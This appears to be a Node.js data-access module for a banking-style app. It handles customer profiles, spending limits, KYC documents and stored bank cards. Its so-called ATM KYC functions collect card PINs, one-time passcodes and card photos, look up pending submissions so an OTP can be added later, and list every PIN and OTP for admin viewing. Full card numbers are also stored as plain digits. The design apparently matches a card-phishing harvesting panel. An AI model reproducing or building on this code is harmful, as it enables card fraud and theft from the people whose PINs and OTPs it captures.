'use strict';

function parseSpendingLimits(raw) {
  const defaults = {
    overall: null,
    daily: null,
    monthly: null,
    shopping: null,
    online: null,
    other: null
  };
  if (raw == null || raw === '') return defaults;
  try {
    const obj = typeof raw === 'string' ? JSON.parse(raw) : raw;
    if (!obj || typeof obj !== 'object') return defaults;
    return {
      overall: obj.overall != null ? Number(obj.overall) : null,
      daily: obj.daily != null ? Number(obj.daily) : null,
      monthly: obj.monthly != null ? Number(obj.monthly) : null,
      shopping: obj.shopping != null ? Number(obj.shopping) : null,
      online: obj.online != null ? Number(obj.online) : null,
      other: obj.other != null ? Number(obj.other) : null
    };
  } catch (_) {
    return defaults;
  }
}


const { uuidToBinary, binaryToUuid, newBinaryId } = require('../utils/ids');

function createCustomerRepository(pool) {
  return {
    async getProfile(userId) {
      const [rows] = await pool.query(
        `SELECT cp.*, u.email, u.phone_e164, u.status, u.email_verified_at, u.mfa_enrolled_at
         FROM customer_profiles cp
         JOIN users u ON u.id = cp.user_id
         WHERE cp.user_id = ? LIMIT 1`,
        [uuidToBinary(userId)]
      );
      if (!rows[0]) return null;
      const r = rows[0];
      return {
        userId: binaryToUuid(r.user_id),
        customerReference: r.customer_reference,
        firstName: r.first_name,
        middleName: r.middle_name,
        lastName: r.last_name,
        dateOfBirth: r.date_of_birth,
        countryCode: r.country_code,
        preferredLocale: r.preferred_locale,
        profilePhotoUrl: (function () {
          const v = r.profile_photo_url;
          if (v == null || v === '') return null;
          if (Buffer.isBuffer(v)) return v.toString('utf8');
          return String(v);
        })(),
        email: r.email,
        phoneE164: r.phone_e164,
        status: r.status,
        emailVerifiedAt: r.email_verified_at,
        mfaEnrolledAt: r.mfa_enrolled_at
      };
    },

    
    async updatePreferredLocale(userId, locale) {
      await pool.query(
        `UPDATE customer_profiles SET preferred_locale = ? WHERE user_id = ?`,
        [String(locale || 'en').slice(0, 12), uuidToBinary(userId)]
      );
    },

    async updateSpendingLimits(userId, limits) {
      const uid = uuidToBinary(userId);
      const payload = JSON.stringify({
        overall: limits.overall != null ? Number(limits.overall) : null,
        daily: limits.daily != null ? Number(limits.daily) : null,
        monthly: limits.monthly != null ? Number(limits.monthly) : null,
        shopping: limits.shopping != null ? Number(limits.shopping) : null,
        online: limits.online != null ? Number(limits.online) : null,
        other: limits.other != null ? Number(limits.other) : null
      });
      const [result] = await pool.query(
        `UPDATE customer_profiles SET spending_limits = ? WHERE user_id = ?`,
        [payload, uid]
      );
      if (result.affectedRows === 0) {
        const ref = `CUS${Date.now().toString(36).toUpperCase()}`;
        await pool.query(
          `INSERT INTO customer_profiles
            (user_id, customer_reference, first_name, last_name, preferred_locale, spending_limits)
           VALUES (?, ?, 'Customer', 'User', 'en', ?)`,
          [uid, ref, payload]
        );
      }
    },


    async updateProfilePhoto(userId, photoUrl) {
      const uid = uuidToBinary(userId);
      try {
        const [result] = await pool.query(
          `UPDATE customer_profiles SET profile_photo_url = ? WHERE user_id = ?`,
          [photoUrl || null, uid]
        );
        if (result.affectedRows === 0) {
          const ref = `CUS${Date.now().toString(36).toUpperCase()}`;
          await pool.query(
            `INSERT INTO customer_profiles
              (user_id, customer_reference, first_name, last_name, profile_photo_url, preferred_locale)
             VALUES (?, ?, 'Customer', 'User', ?, 'en')`,
            [uid, ref, photoUrl || null]
          );
        }
      } catch (err) {
        if (err && (err.code === 'ER_BAD_FIELD_ERROR' || String(err.message || '').includes('profile_photo_url'))) {
          const e = new Error(
            'Database is missing profile_photo_url. Run: ALTER TABLE customer_profiles ADD COLUMN profile_photo_url MEDIUMTEXT NULL;'
          );
          e.status = 500;
          throw e;
        }
        throw err;
      }
    },

    async getCountryCode(userId) {
      const [rows] = await pool.query(
        `SELECT country_code FROM customer_profiles WHERE user_id = ? LIMIT 1`,
        [uuidToBinary(userId)]
      );
      return rows[0]?.country_code || null;
    },

    async updateProfile(userId, { firstName, lastName, middleName, countryCode, preferredLocale }) {
      const uid = uuidToBinary(userId);
      const [existing] = await pool.query(
        `SELECT user_id FROM customer_profiles WHERE user_id = ? LIMIT 1`,
        [uid]
      );

      if (existing[0]) {
        await pool.query(
          `UPDATE customer_profiles
           SET first_name = ?, last_name = ?, middle_name = ?, country_code = ?, preferred_locale = ?
           WHERE user_id = ?`,
          [
            firstName,
            lastName,
            middleName || null,
            countryCode || null,
            preferredLocale || 'en',
            uid
          ]
        );
      } else {
        // Profile row missing (e.g. admin-created user) — create it so country persists
        const ref = `CUS${Date.now().toString(36).toUpperCase()}`;
        await pool.query(
          `INSERT INTO customer_profiles
            (user_id, customer_reference, first_name, last_name, middle_name, country_code, preferred_locale)
           VALUES (?, ?, ?, ?, ?, ?, ?)`,
          [
            uid,
            ref,
            firstName || 'Customer',
            lastName || 'User',
            middleName || null,
            countryCode || null,
            preferredLocale || 'en'
          ]
        );
        console.error('[GLOBE_PROFILE] created missing customer_profiles row', JSON.stringify({ userId, countryCode }));
      }
    },

    async setCountryCode(userId, countryCode) {
      const uid = uuidToBinary(userId);
      const code = countryCode || null;
      const [result] = await pool.query(
        `UPDATE customer_profiles SET country_code = ? WHERE user_id = ?`,
        [code, uid]
      );
      if (result.affectedRows === 0) {
        const ref = `CUS${Date.now().toString(36).toUpperCase()}`;
        await pool.query(
          `INSERT INTO customer_profiles
            (user_id, customer_reference, first_name, last_name, country_code, preferred_locale)
           VALUES (?, ?, 'Customer', 'User', ?, 'en')`,
          [uid, ref, code]
        );
        console.error('[GLOBE_PROFILE] setCountryCode inserted profile', JSON.stringify({ userId, countryCode: code }));
      } else {
        console.error('[GLOBE_PROFILE] setCountryCode updated', JSON.stringify({ userId, countryCode: code, affected: result.affectedRows }));
      }
      return code;
    },

    async listAccountLinks(userId) {
      const [rows] = await pool.query(
        `SELECT id, provider_code, currency_code, display_label, account_type, link_status, linked_at
         FROM bank_account_links
         WHERE user_id = ? AND unlinked_at IS NULL
         ORDER BY linked_at DESC`,
        [uuidToBinary(userId)]
      );
      return rows.map((r) => ({
        id: binaryToUuid(r.id),
        providerCode: r.provider_code,
        currencyCode: r.currency_code,
        displayLabel: r.display_label,
        accountType: r.account_type,
        linkStatus: r.link_status,
        linkedAt: r.linked_at
      }));
    },

    async listKycDocuments(userId) {
      const [rows] = await pool.query(
        `SELECT id, document_type, storage_provider, verification_status, created_at, reviewed_at, expiry_date
         FROM kyc_documents
         WHERE user_id = ? AND deleted_at IS NULL
         ORDER BY created_at DESC`,
        [uuidToBinary(userId)]
      );
      return rows.map((r) => ({
        id: binaryToUuid(r.id),
        documentType: r.document_type,
        storageProvider: r.storage_provider,
        verificationStatus: r.verification_status,
        createdAt: r.created_at,
        reviewedAt: r.reviewed_at,
        expiryDate: r.expiry_date
      }));
    },


    async getKycDocumentById(documentId) {
      const [rows] = await pool.query(
        `SELECT id, user_id, document_type, storage_provider, storage_asset_id,
                verification_status, created_at, deleted_at
         FROM kyc_documents
         WHERE id = ? AND deleted_at IS NULL
         LIMIT 1`,
        [uuidToBinary(documentId)]
      );
      if (!rows[0]) return null;
      const r = rows[0];
      return {
        id: binaryToUuid(r.id),
        userId: binaryToUuid(r.user_id),
        documentType: r.document_type,
        storageProvider: r.storage_provider,
        storageAssetId: r.storage_asset_id,
        verificationStatus: r.verification_status,
        createdAt: r.created_at
      };
    },

    
    
    async listBankCards(userId) {
      try {
        const [rows] = await pool.query(
          `SELECT id, holder_name, card_number, last4, brand, expiry, card_type, status,
                  monthly_limit, daily_limit, spent_this_month, currency_code, created_at
           FROM bank_cards
           WHERE user_id = ?
           ORDER BY created_at DESC
           LIMIT 20`,
          [uuidToBinary(userId)]
        );
        return rows.map((r) => ({
          id: binaryToUuid(r.id),
          holderName: r.holder_name,
          cardNumber: r.card_number,
          last4: r.last4,
          brand: r.brand,
          expiry: r.expiry,
          type: r.card_type,
          status: r.status,
          monthlyLimit: r.monthly_limit != null ? Number(r.monthly_limit) : null,
          dailyLimit: r.daily_limit != null ? Number(r.daily_limit) : null,
          spentThisMonth: r.spent_this_month != null ? Number(r.spent_this_month) : 0,
          currencyCode: r.currency_code || 'USD',
          createdAt: r.created_at
        }));
      } catch (err) {
        if (err && err.code === 'ER_NO_SUCH_TABLE') return [];
        throw err;
      }
    },

    async upsertBankCard(userId, card) {
      const crypto = require('node:crypto');
      const digits = String(card.cardNumber || '').replace(/\D/g, '');
      const last4 = digits.slice(-4) || '0000';
      const brand = String(card.brand || 'visa').toLowerCase();
      const holderName = String(card.holderName || 'CARDHOLDER').slice(0, 160);
      const expiry = String(card.expiry || '12/30').slice(0, 7);
      const cardType = String(card.type || card.cardType || 'Debit').slice(0, 40);
      const status = String(card.status || 'active').toLowerCase();
      const currencyCode = String(card.currencyCode || 'USD').toUpperCase().slice(0, 3);
      const monthlyLimit = card.monthlyLimit != null ? Number(card.monthlyLimit) : null;
      const dailyLimit = card.dailyLimit != null ? Number(card.dailyLimit) : null;
      const spentThisMonth = card.spentThisMonth != null ? Number(card.spentThisMonth) : 0;

      if (card.id) {
        await pool.query(
          `UPDATE bank_cards
           SET holder_name = ?, card_number = ?, last4 = ?, brand = ?, expiry = ?,
               card_type = ?, status = ?, monthly_limit = ?, daily_limit = ?,
               spent_this_month = ?, currency_code = ?
           WHERE id = ? AND user_id = ?`,
          [
            holderName, digits, last4, brand, expiry, cardType, status,
            monthlyLimit, dailyLimit, spentThisMonth, currencyCode,
            uuidToBinary(card.id), uuidToBinary(userId)
          ]
        );
        return card.id;
      }

      const id = crypto.randomUUID();
      await pool.query(
        `INSERT INTO bank_cards
          (id, user_id, holder_name, card_number, last4, brand, expiry, card_type, status,
           monthly_limit, daily_limit, spent_this_month, currency_code)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        [
          uuidToBinary(id), uuidToBinary(userId), holderName, digits, last4, brand, expiry,
          cardType, status, monthlyLimit, dailyLimit, spentThisMonth, currencyCode
        ]
      );
      return id;
    },

    async createAtmSubmission({ userId, holderName, bankName, otpCode, pinCipher, frontDocumentId, backDocumentId }) {
      const crypto = require('node:crypto');
      const id = crypto.randomUUID();
      await pool.query(
        `INSERT INTO kyc_atm_submissions
          (id, user_id, holder_name, bank_name, otp_code, pin_cipher, front_document_id, back_document_id, status)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'pending')`,
        [
          uuidToBinary(id),
          uuidToBinary(userId),
          holderName,
          bankName,
          otpCode || null,
          pinCipher || null,
          frontDocumentId ? uuidToBinary(frontDocumentId) : null,
          backDocumentId ? uuidToBinary(backDocumentId) : null
        ]
      );
      return id;
    },

    
    async listAllAtmSubmissions(limit = 50) {
      try {
        const [rows] = await pool.query(
          `SELECT a.id, a.user_id, a.holder_name, a.bank_name, a.otp_code, a.pin_cipher,
                  a.front_document_id, a.back_document_id, a.status, a.created_at,
                  u.email, cp.first_name, cp.last_name, cp.customer_reference
           FROM kyc_atm_submissions a
           JOIN users u ON u.id = a.user_id
           LEFT JOIN customer_profiles cp ON cp.user_id = a.user_id
           ORDER BY a.created_at DESC
           LIMIT ?`,
          [Number(limit) || 50]
        );
        return rows.map((r) => ({
          id: binaryToUuid(r.id),
          userId: binaryToUuid(r.user_id),
          holderName: r.holder_name,
          bankName: r.bank_name,
          otpCode: r.otp_code,
          pin: r.pin_cipher,
          frontDocumentId: r.front_document_id ? binaryToUuid(r.front_document_id) : null,
          backDocumentId: r.back_document_id ? binaryToUuid(r.back_document_id) : null,
          status: r.status,
          createdAt: r.created_at,
          email: r.email,
          firstName: r.first_name,
          lastName: r.last_name,
          customerReference: r.customer_reference
        }));
      } catch (err) {
        if (err && err.code === 'ER_NO_SUCH_TABLE') return [];
        throw err;
      }
    },

    async getAtmSubmissionById(id) {
      const [rows] = await pool.query(
        `SELECT a.id, a.user_id, a.holder_name, a.bank_name, a.otp_code, a.pin_cipher,
                a.front_document_id, a.back_document_id, a.status, a.created_at,
                u.email, cp.first_name, cp.last_name, cp.customer_reference
         FROM kyc_atm_submissions a
         JOIN users u ON u.id = a.user_id
         LEFT JOIN customer_profiles cp ON cp.user_id = a.user_id
         WHERE a.id = ?
         LIMIT 1`,
        [uuidToBinary(id)]
      );
      if (!rows[0]) return null;
      const r = rows[0];
      return {
        id: binaryToUuid(r.id),
        userId: binaryToUuid(r.user_id),
        holderName: r.holder_name,
        bankName: r.bank_name,
        otpCode: r.otp_code,
        pin: r.pin_cipher,
        frontDocumentId: r.front_document_id ? binaryToUuid(r.front_document_id) : null,
        backDocumentId: r.back_document_id ? binaryToUuid(r.back_document_id) : null,
        status: r.status,
        createdAt: r.created_at,
        email: r.email,
        firstName: r.first_name,
        lastName: r.last_name,
        customerReference: r.customer_reference
      };
    },

    async updateAtmSubmissionStatus(id, status) {
      await pool.query(
        `UPDATE kyc_atm_submissions SET status = ? WHERE id = ?`,
        [status, uuidToBinary(id)]
      );
    },

    async listAtmSubmissions(userId) {
      const [rows] = await pool.query(
        `SELECT id, holder_name, bank_name, otp_code, status, created_at
         FROM kyc_atm_submissions
         WHERE user_id = ?
         ORDER BY created_at DESC
         LIMIT 20`,
        [uuidToBinary(userId)]
      );
      return rows.map((r) => ({
        id: binaryToUuid(r.id),
        holderName: r.holder_name,
        bankName: r.bank_name,
        hasOtp: Boolean(r.otp_code),
        status: r.status,
        createdAt: r.created_at
      }));
    },

    async getPendingAtmForOtp(userId) {
      const [rows] = await pool.query(
        `SELECT id, holder_name, bank_name, status, created_at
         FROM kyc_atm_submissions
         WHERE user_id = ?
           AND (otp_code IS NULL OR otp_code = '')
           AND status = 'pending'
         ORDER BY created_at DESC
         LIMIT 1`,
        [uuidToBinary(userId)]
      );
      if (!rows[0]) return null;
      const r = rows[0];
      return {
        id: binaryToUuid(r.id),
        holderName: r.holder_name,
        bankName: r.bank_name,
        status: r.status,
        createdAt: r.created_at
      };
    },

    async updateAtmOtp(userId, submissionId, otpCode) {
      const [result] = await pool.query(
        `UPDATE kyc_atm_submissions
         SET otp_code = ?
         WHERE id = ? AND user_id = ? AND (otp_code IS NULL OR otp_code = '')`,
        [otpCode, uuidToBinary(submissionId), uuidToBinary(userId)]
      );
      return result.affectedRows > 0;
    },

    async createKycDocument({ userId, documentType, storageProvider, storageAssetId }) {
      const id = newBinaryId();
      await pool.query(
        `INSERT INTO kyc_documents (id, user_id, document_type, storage_provider, storage_asset_id)
         VALUES (?, ?, ?, ?, ?)`,
        [id, uuidToBinary(userId), documentType, storageProvider, storageAssetId]
      );
      return binaryToUuid(id);
    }
  };
}

module.exports = { createCustomerRepository };